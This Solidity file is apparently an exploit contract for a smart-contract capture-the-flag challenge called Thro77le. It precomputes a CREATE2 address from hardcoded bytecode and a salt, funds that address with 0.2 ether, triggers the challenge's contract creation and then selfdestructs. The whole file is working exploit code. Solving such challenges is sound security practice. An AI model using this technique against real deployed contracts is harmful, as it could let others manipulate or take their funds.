// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;

import "hardhat/console.sol";

interface IChallenge_Thro77le {
    function createContract(bytes memory bytecode, uint256 salt) external;
}

interface Thro77le_Factory {
    function createContract(bytes memory bytecode, uint256 salt) external returns (bool);
}

contract Exploit_Thro77le {
    IChallenge_Thro77le instance;
    address factory;

    bytes contractBytecode =
        hex"608060405234801561001057600080fd5b5061015d806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806306fdde031461003b5780637872ab4914610059575b600080fd5b61004361009d565b6040518082815260200191505060405180910390f35b61009b6004803603602081101561006f57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506100c5565b005b60007f736d617278000000000000000000000000000000000000000000000000000000905090565b8073ffffffffffffffffffffffffffffffffffffffff1663380c7a676040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561010d57600080fd5b505af1158015610121573d6000803e3d6000fd5b505050505056fea265627a7a72315820fb2fc7a07f0eebf799c680bb1526641d2d905c19393adf340a04e48c9b527de964736f6c634300050c0032";

    constructor(IChallenge_Thro77le _instance) payable {
        instance = _instance;
        factory = address(0xFD4f30C20dA65a37fd74d55B257442a08469e6A6);
    }

    function finalize() external payable {
        bytes memory bytecode = contractBytecode;

        uint256 salt = 5975;
        address addr = computeAddress(bytecode, factory, salt);

        payable(addr).transfer(0.2 ether);

        instance.createContract(bytecode, salt);

        selfdestruct(payable(msg.sender));
    }

    function computeAddress(
        bytes memory bytecode,
        address factory,
        uint256 _salt
    ) public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), factory, _salt, keccak256(bytecode)));
        return address(uint160(uint256(hash)));
    }
}
